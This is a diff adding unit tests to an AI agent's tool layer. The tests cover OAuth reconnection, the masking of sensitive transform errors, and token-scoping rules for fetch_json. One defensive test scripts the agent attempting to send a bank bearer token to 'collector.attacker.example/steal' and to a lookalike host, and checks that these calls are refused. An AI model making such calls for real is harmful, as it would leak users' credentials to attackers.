@@ -82,6 +82,45 @@ describe("turn-ending tools", () => {
   });
 });
 
+describe("sign-in connections", () => {
+  const PAST = "2026-01-01T00:00:00Z";
+  const signInSeen = (model: Parameters<typeof toolResultsSeen>[0]) => JSON.stringify(toolResultsSeen(model, "find_builtin"));
+
+  test("an expired token that can't be refreshed counts as disconnected and sign-in is offered again", async () => {
+    env.services.oauth?.tokens.save("alice", "bank", { accessToken: "old", refreshToken: "revoked", expiresAt: PAST });
+    const { endedBy, model } = await turn([
+      { calls: [{ tool: "find_builtin", input: {} }] },
+      { calls: [{ tool: "start_oauth", input: { provider: "bank" } }] },
+    ]);
+    expect(signInSeen(model)).toContain('"id":"bank","name":"your bank","apiOrigins":["https://api.bank.test"],"connected":false');
+    expect(signInSeen(model)).toContain('"signIn":{"provider":"bank","available":true,"connected":false}');
+    expect(endedBy).toBe("oauth");
+    expect(env.events.some((event) => event.type === "oauth")).toBe(true);
+  });
+
+  test("a refused token is auth_missing, and start_oauth with reconnect offers a fresh sign-in", async () => {
+    env.services.oauth?.tokens.save("alice", "bank", { accessToken: "revoked-token" });
+    env.services.runtime.fetch = (async () => new Response("", { status: 401 })) as unknown as typeof fetch;
+    const { endedBy, model } = await turn([
+      { calls: [{ tool: "fetch_json", input: { url: "https://api.bank.test/balances", auth: "bank" } }] },
+      { calls: [{ tool: "start_oauth", input: { provider: "bank", reconnect: true } }] },
+    ]);
+    const fetched = JSON.stringify(toolResultsSeen(model, "fetch_json"));
+    expect(fetched).toContain('"kind":"auth_missing"');
+    expect(fetched).toContain("reconnect: true");
+    expect(endedBy).toBe("oauth");
+    expect(env.events.find((event) => event.type === "oauth")).toMatchObject({ provider: "bank" });
+  });
+
+  test("a usable token without reconnect is reported as already connected", async () => {
+    env.services.oauth?.tokens.save("alice", "bank", { accessToken: "good-token" });
+    const { endedBy, model } = await turn([{ calls: [{ tool: "start_oauth", input: { provider: "bank" } }] }, { text: "You're connected." }]);
+    expect(endedBy).toBe("text");
+    expect(env.events.some((event) => event.type === "oauth")).toBe(false);
+    expect(JSON.stringify(toolResultsSeen(model, "start_oauth"))).toContain('"alreadyConnected":true');
+  });
+});
+
 describe("preview and save", () => {
   test("preview_pearl sends real values to the app", async () => {
     const { model } = await turn([{ calls: [{ tool: "preview_pearl", input: weatherDraft }] }, { text: "Here it is." }]);
@@ -228,6 +267,18 @@ describe("preview and save", () => {
     expect(result).toContain("transform");
     expect(result).toContain("feed broke");
   });
+
+  test("a sensitive transform's own error text never reaches the model", async () => {
+    env.payload.current = { visitors: [{ id: 1, name: "Ada Lovelace", notes: null }] };
+    const hub: DraftPearl = {
+      sources: [{ id: "hub", url: "https://hub.test/visitors", method: "GET", sensitive: true }],
+      inputs: {},
+      transform: `(s) => { const v = s.hub.visitors[0]; if (!v.notes) throw new Error("no note for " + v.name); return { value: v.notes }; }`,
+    };
+    const { model } = await turn([{ calls: [{ tool: "test_pearl", input: hub }] }, { text: "Hmm." }]);
+    expect(JSON.stringify(toolResultsSeen(model, "test_pearl"))).toContain("Error (message hidden)");
+    for (const value of ["Ada", "Lovelace"]) expect(modelVisible(model)).not.toContain(value);
+  });
 });
 
 describe("limits", () => {
@@ -276,6 +327,24 @@ describe("fetch_json", () => {
     const { model } = await turn([{ calls: [{ tool: "fetch_json", input: { url: "http://127.0.0.1/admin" } }] }, { text: "Hmm." }]);
     expect(env.fetched).toEqual([]);
     expect(JSON.stringify(toolResultsSeen(model, "fetch_json"))).toContain("forbidden_url");
+  });
+
+  test("a sign-in token is only sent over https to its provider's API origins", async () => {
+    env.services.oauth?.tokens.save("alice", "bank", { accessToken: "tok-secret-123" });
+    const sent: Array<{ url: string; auth: string | null }> = [];
+    env.services.runtime.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
+      sent.push({ url: String(input), auth: new Headers(init?.headers).get("authorization") });
+      return Response.json({ ok: 1 });
+    }) as typeof fetch;
+    const refused = ["https://collector.attacker.example/steal", "http://api.bank.test/balances", "https://api.bank.test.attacker.example/balances"];
+    const { model } = await turn([
+      { calls: refused.map((url) => ({ tool: "fetch_json", input: { url, auth: "bank" } })) },
+      { calls: [{ tool: "fetch_json", input: { url: "https://api.bank.test/balances", auth: "bank" } }] },
+      { text: "ok" },
+    ]);
+    const results = toolResultsSeen(model, "fetch_json").map((result) => JSON.stringify(result));
+    expect(results.slice(0, 3).every((result) => result.includes("forbidden_url") && result.includes("https://api.bank.test"))).toBe(true);
+    expect(sent).toEqual([{ url: "https://api.bank.test/balances", auth: "Bearer tok-secret-123" }]);
   });
 
   test("public JSON comes back as a summary with samples", async () => {
